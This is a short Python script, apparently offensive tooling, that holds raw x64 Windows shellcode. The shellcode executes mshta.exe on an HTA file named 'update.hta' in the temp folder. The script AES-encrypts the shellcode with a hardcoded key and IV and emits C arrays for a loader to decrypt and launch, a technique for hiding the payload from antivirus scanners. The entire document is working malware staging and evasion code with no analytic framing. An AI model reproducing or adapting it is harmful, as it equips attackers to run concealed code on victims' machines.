buf =  ""
buf += "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
buf += "\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
buf += "\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
buf += "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
buf += "\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
buf += "\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
buf += "\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
buf += "\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
buf += "\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
buf += "\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
buf += "\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
buf += "\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
buf += "\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
buf += "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
buf += "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
buf += "\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
buf += "\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"
buf += "\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
buf += "\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
buf += "\x00\x59\x41\x89\xda\xff\xd5\x25\x57\x49\x4e\x44\x49"
buf += "\x52\x25\x2f\x53\x79\x73\x57\x4f\x57\x36\x34\x2f\x6d"
buf += "\x73\x68\x74\x61\x2e\x65\x78\x65\x20\x25\x74\x65\x6d"
buf += "\x70\x25\x2f\x75\x70\x64\x61\x74\x65\x2e\x68\x74\x61"
buf += "\x00"

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from binascii import unhexlify
import hashlib
import sys
m = hashlib.sha256()
key = 'BIGGEST-OOF'
iv = '0123456789abcdef'
m.update(key)
key = m.digest()
key = unhexlify(m.hexdigest())
print("+++ key: " + m.hexdigest())
print("+++ key raw: " + key)
obj = AES.new(key, AES.MODE_CBC, iv)
obj2 = AES.new(key, AES.MODE_CBC, iv)
ct = obj.encrypt(pad(buf, 16))
buf2 = unpad(obj2.decrypt(ct),16)

sys.stdout.write('unsigned char LAUNCH_SHELLCODE_BUF[' + str(len(ct))+ '] = { ')
for i in range(0, len(ct)):
    sys.stdout.write(hex(ord(ct[i])))
    if i % 10 == 0:
        sys.stdout.write(',\n')
    elif i < len(ct)-1:
        sys.stdout.write(',')    
    else:
        pass
sys.stdout.write('};\nint LAUNCH_SHELLCODE_LEN = ' + str(len(ct)) + ';\n')
sys.stdout.write('const unsigned char LAUNCH_KEY[' + str(len(key))+ '] = { ')
for i in range(0, len(key)):
    sys.stdout.write(hex(ord(key[i])))
    if i % 10 == 0:
        sys.stdout.write(',\n')
    elif i < len(key)-1:
        sys.stdout.write(',')    
    else:
        pass
sys.stdout.write('};\nint LAUNCH_KEY_LEN = ' + str(len(key)) + ';\n')
sys.stdout.write('const unsigned char LAUNCH_IV[' + str(len(iv))+ '] = { ')
for i in range(0, len(iv)):
    sys.stdout.write(hex(ord(iv[i])))
    if i % 10 == 0:
        sys.stdout.write(',\n')
    elif i < len(iv)-1:
        sys.stdout.write(',')    
    else:
        pass
sys.stdout.write('};\nint LAUNCH_IV_LEN = ' + str(len(iv)) + ';\n')
